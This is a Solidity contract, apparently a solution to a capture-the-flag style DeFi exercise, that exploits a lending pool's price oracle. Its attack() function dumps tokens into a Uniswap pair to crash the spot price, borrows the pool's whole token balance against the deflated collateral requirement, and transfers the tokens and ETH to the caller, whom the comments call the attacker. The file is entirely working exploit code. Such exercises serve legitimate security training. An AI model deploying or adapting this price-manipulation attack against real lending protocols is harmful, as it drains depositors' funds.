// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
interface UniswapPair {
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline) 
        external 
        returns (uint256 eth_bought);
}

interface DVT {
    function balanceOf(address user) external view returns (uint);
    function approve(address user, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
}

interface Pool {
    function calculateDepositRequired(uint256 amount) external view returns (uint256);
    function borrow(uint256 borrowAmount) external payable;
}

contract Exploit8 {

    UniswapPair pair;
    DVT dvt;
    Pool pool;

    function attack(address pair_, address dvt_, address pool_) public payable {
        pair = UniswapPair(pair_);
        dvt = DVT(dvt_);
        pool = Pool(pool_);

        uint dvtAmount = dvt.balanceOf(address(this));
        require(dvtAmount > 0, "no dvt");

        // should be 200,000 eth to borrow 100,000 dvt right now
        uint depReq = pool.calculateDepositRequired(dvt.balanceOf(address(pool)));

        // approve uniswap pair to transfer of tokens for the swap
        dvt.approve(pair_, dvtAmount);
        uint ethBought = pair.tokenToEthSwapInput(dvtAmount - 1, 1, block.timestamp + 10);

        require(ethBought > 0, "no eth bought");

        // how much we need to borrow entire pool
        depReq = pool.calculateDepositRequired(dvt.balanceOf(address(pool)));

        // borrow the entire pool for dirt cheap
        require(address(this).balance >= depReq, "not enough to borrow entire pool");
        pool.borrow{value: depReq}(dvt.balanceOf(address(pool)));

        // send the eth and tokens to attacker
        dvt.transfer(msg.sender, dvt.balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}